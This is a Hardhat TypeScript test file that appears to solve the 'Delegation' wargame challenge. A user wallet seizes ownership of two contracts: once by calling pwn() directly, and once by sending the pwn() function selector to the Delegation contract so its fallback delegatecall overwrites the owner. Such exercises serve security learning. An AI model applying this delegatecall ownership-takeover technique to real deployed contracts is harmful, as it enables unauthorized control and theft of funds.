import { ethers } from 'hardhat';
import chai from 'chai';
import { Delegate__factory, Delegation__factory, Delegate, Delegation } from '../../typechain';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/dist/src/signer-with-address';
import { utils } from 'ethers/lib/ethers';
import { TransactionResponse, TransactionReceipt } from '@ethersproject/abstract-provider';

const { expect } = chai;

let delegateContract: Delegate;
let delegateContractFactory: Delegate__factory;
let delegationContract: Delegation;
let delegationContractFactory: Delegation__factory;
let wallets: SignerWithAddress[];
let deployerWallet: SignerWithAddress;
let userWallet: SignerWithAddress;

describe('Delegation Tests', () => {
    beforeEach(async () => {
        wallets = await ethers.getSigners();
        deployerWallet = wallets[0];
        userWallet = wallets[1];

        delegateContractFactory = (await ethers.getContractFactory(
            'Delegate',
            deployerWallet
        )) as Delegate__factory;

        delegateContract = (await delegateContractFactory.deploy(deployerWallet.address)) as Delegate;

        delegationContractFactory = (await ethers.getContractFactory(
            'Delegation',
            deployerWallet
        )) as Delegation__factory;

        delegationContract = (await delegationContractFactory.deploy(delegateContract.address)) as Delegation;
    });

    describe('Function tests', async () => {
        it('Claim Ownership of Delegate Contract', async () => {          
            expect(await delegateContract.owner()).to.be.equal(deployerWallet.address);
            expect(await delegationContract.owner()).to.be.equal(deployerWallet.address);

            //claim ownership of Delegate
            const tx: TransactionResponse = await delegateContract.connect(userWallet).pwn();
            const contractReceipt: TransactionReceipt = await tx.wait();
            expect(contractReceipt.status).to.be.equal(1);
            
            expect(await delegateContract.owner()).to.be.equal(userWallet.address);
            expect(await delegationContract.owner()).to.be.equal(deployerWallet.address);            
        });
        it('Claim Ownership of Delegation Contract with delegatecall - out of gas', async () => {
            expect(await delegateContract.owner()).to.be.equal(deployerWallet.address);
            expect(await delegationContract.owner()).to.be.equal(deployerWallet.address);

            //claim ownership of Delegation
            const pwner = utils.keccak256(utils.toUtf8Bytes('pwn()')).substring(0, 10);
            const tx: TransactionResponse = await userWallet.sendTransaction({ to: delegationContract.address, data: pwner, gasLimit: 30000 });
            const contractReceipt: TransactionReceipt = await tx.wait();

            // internal transaction fails due to 'out of gas' but main transaction is successful
            expect(contractReceipt.status).to.be.equal(1);

            // by adding this revert code to fallback() in the Delegate Contract, you can get the transaction to return 'Transaction ran out of gas'
            // else {
            //     revert();
            // }

            expect(await delegateContract.owner()).to.be.equal(deployerWallet.address);
            expect(await delegationContract.owner()).to.be.equal(deployerWallet.address);
        });
        it('Claim Ownership of Delegation Contract with delegatecall', async () => {
            expect(await delegateContract.owner()).to.be.equal(deployerWallet.address);
            expect(await delegationContract.owner()).to.be.equal(deployerWallet.address);

            //claim ownership of Delegation
            const pwner = utils.keccak256(utils.toUtf8Bytes('pwn()')).substring(0, 10);
            const tx: TransactionResponse = await userWallet.sendTransaction({ to: delegationContract.address, data: pwner, gasLimit: 60000 });
            // Alternate way of calling with fallback
            //const tx: TransactionResponse = await delegationContract.connect(userWallet).fallback({ data: pwner, gasLimit: 60000 });
            const contractReceipt: TransactionReceipt = await tx.wait();
            expect(contractReceipt.status).to.be.equal(1);
            
            expect(await delegateContract.owner()).to.be.equal(deployerWallet.address);
            expect(await delegationContract.owner()).to.be.equal(userWallet.address);
        });
    });
});


